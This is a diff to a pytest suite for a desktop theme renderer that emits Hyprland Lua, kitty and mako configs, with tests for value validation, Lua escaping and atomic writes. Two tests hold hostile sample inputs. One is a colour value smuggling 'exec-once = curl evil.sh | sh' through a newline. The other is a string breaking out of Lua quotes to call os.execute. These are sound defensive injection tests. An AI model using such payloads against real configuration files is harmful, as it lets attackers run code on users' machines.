@@ -41,16 +41,14 @@ def test_validate_treats_an_empty_role_as_missing(render_theme, minimal_theme):
 
 
 # ── Value shapes: what keeps a theme data rather than code ────────────────
-# The role contract says which keys exist; these say what a value may BE. The
-# stakes are concrete: config/hypr/theme.conf is `source`d by hyprland.conf, so
-# a colour that smuggles a newline appends real Hyprland directives.
+# The role contract says which keys exist; these say what a value may BE. Theme
+# values cross into several config languages, including executable Lua.
 def test_check_values_accepts_a_complete_theme(render_theme, minimal_theme):
     assert render_theme.check_values(minimal_theme) == []
 
 
 def test_a_colour_carrying_a_newline_cannot_render(render_theme, minimal_theme):
-    """The injection this gate exists for: `\\n` is a legal TOML escape, so
-    tomllib hands us a real newline, and hyprland.conf sources what we write."""
+    """A literal TOML newline is rejected before any template receives it."""
     minimal_theme["sem"]["accent"] = "#000000\nexec-once = curl evil.sh | sh"
     problems = render_theme.check_values(minimal_theme)
     assert len(problems) == 1 and "sem.accent" in problems[0]
@@ -524,7 +522,9 @@ def test_anim_speed_zero_means_no_animations(render_theme, minimal_theme, templa
     minimal_theme["params"]["anim_speed"] = 0
     assert render_theme.build_context(minimal_theme, lenient=False)["params"]["anim"] is None
     out = _render(render_theme, minimal_theme, templates_dir, tmp_path)
-    assert "enabled = 0" in (out / "hypr" / "theme.conf").read_text()
+    lua = (out / "hypr" / "theme.lua").read_text()
+    assert "animations = { enabled = false }" in lua
+    assert "hl.animation" not in lua
 
 
 # bar_opacity — the bar backdrop, now themed rather than a style.css literal.
@@ -623,3 +623,67 @@ def test_kitty_maps_the_glyph_ranges_to_the_icon_font(
     assert maps, "kitty renders no symbol_map — icons would fall to fontconfig"
     assert all(ln.endswith("IconGlyphs") for ln in maps)
     assert any("U+E000" in ln for ln in maps), "the main Private Use Area is unmapped"
+
+
+# ── Hyprland 0.57 Lua output ──────────────────────────────────────────────
+def test_lua_serialization_escapes_executable_looking_strings(render_theme):
+    hostile = '"; }\nos.execute("touch /tmp/hwe-must-not-run") -- \\'
+    encoded = render_theme._lua(hostile)
+    assert encoded.startswith('"') and encoded.endswith('"')
+    assert "\\n" in encoded and '\\"' in encoded and "\\\\" in encoded
+    assert "\nos.execute" not in encoded
+    assert render_theme._lua(True) == "true"
+    assert render_theme._lua(False) == "false"
+    assert render_theme._lua(None) == "nil"
+    assert render_theme._lua(["rgba(ffffffff)", "rgba(000000ff)"]) == \
+        '{ "rgba(ffffffff)", "rgba(000000ff)" }'
+
+
+def test_hyprland_theme_is_a_single_lua_module(render_theme, minimal_theme, templates_dir, tmp_path):
+    minimal_theme["params"]["border_gradient"] = ["#010203", "#a0b0c0"]
+    out = _render(render_theme, minimal_theme, templates_dir, tmp_path)
+    lua = (out / "hypr" / "theme.lua").read_text()
+    assert "hl.config({" in lua
+    assert 'colors = { "rgba(010203ff)", "rgba(a0b0c0ff)" }' in lua
+    assert "angle =" in lua
+    assert "hl.window_rule({" in lua
+    assert 'opacity = "0.94 0.9 1.0"' in lua
+    assert 'bezier = "wind"' in lua
+    assert ", curve =" not in lua
+    assert (out / "hypr" / "colors.conf").exists()
+    assert (out / "hypr" / "theme.conf").exists()
+
+
+def test_mako_uses_the_current_icon_radius_option(render_theme, minimal_theme, templates_dir, tmp_path):
+    out = _render(render_theme, minimal_theme, templates_dir, tmp_path)
+    config = (out / "mako" / "config").read_text()
+    assert "icon-border-radius=8" in config
+    assert "\nicon-radius=" not in config
+
+
+def test_render_failure_leaves_every_live_file_unchanged(render_theme, minimal_theme, tmp_path):
+    templates = tmp_path / "templates"
+    templates.mkdir()
+    (templates / "a.conf.j2").write_text("new {{ sem.accent }}\n")
+    (templates / "z-broken.conf.j2").write_text("{{ sem.does_not_exist }}\n")
+    from jinja2 import UndefinedError
+
+    out = tmp_path / "out"
+    (out / "hypr").mkdir(parents=True)
+    (out / "a.conf").write_text("old a\n")
+    (out / "z-broken.conf").write_text("old z\n")
+    (out / "hypr" / "colors.conf").write_text("old generated colours\n")
+    with pytest.raises(UndefinedError):
+        render_theme.render_all(minimal_theme, templates, out, lenient=False)
+    assert (out / "a.conf").read_text() == "old a\n"
+    assert (out / "z-broken.conf").read_text() == "old z\n"
+    assert (out / "hypr" / "colors.conf").read_text() == "old generated colours\n"
+    assert not list(tmp_path.glob(".out.stage-*"))
+
+
+def test_atomic_write_replaces_the_complete_file(render_theme, tmp_path):
+    dest = tmp_path / "theme.lua"
+    dest.write_text("a much longer old configuration\n" * 20)
+    render_theme._atomic_write(dest, "hl.config({ general = { border_size = 2 } })\n")
+    assert dest.read_text() == "hl.config({ general = { border_size = 2 } })\n"
+    assert not list(tmp_path.glob(".theme.lua.*"))
